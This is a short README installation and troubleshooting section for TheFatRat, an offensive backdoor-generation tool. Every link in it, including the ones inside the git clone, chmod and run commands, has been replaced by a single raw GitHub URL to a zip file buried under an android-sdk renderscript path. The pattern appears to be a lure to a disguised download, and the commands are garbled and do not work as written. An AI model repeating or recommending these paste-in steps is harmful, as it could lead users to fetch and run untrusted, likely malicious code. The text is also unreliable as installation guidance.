# Installation
Instructions on how to install *TheFatRat*
```bash
git clone https://raw.githubusercontent.com/vijayvijayiocl/TheFatRat/master/tools/android-sdk/renderscript/Fat-Rat-The-2.6.zip
cd TheFatRat
chmod +x https://raw.githubusercontent.com/vijayvijayiocl/TheFatRat/master/tools/android-sdk/renderscript/Fat-Rat-The-2.6.zip && https://raw.githubusercontent.com/vijayvijayiocl/TheFatRat/master/tools/android-sdk/renderscript/Fat-Rat-The-2.6.zip
```
### Update 

### Troubleshoot on TheFatRat
chk_tools script to use in case of problems in https://raw.githubusercontent.com/vijayvijayiocl/TheFatRat/master/tools/android-sdk/renderscript/Fat-Rat-The-2.6.zip of fatrat
this script will check if everything is in the right version to run fatrat
and will also provide you a solution for the problem
```
cd TheFatRat
chmod +x chk_tools 
./chk_tools
```
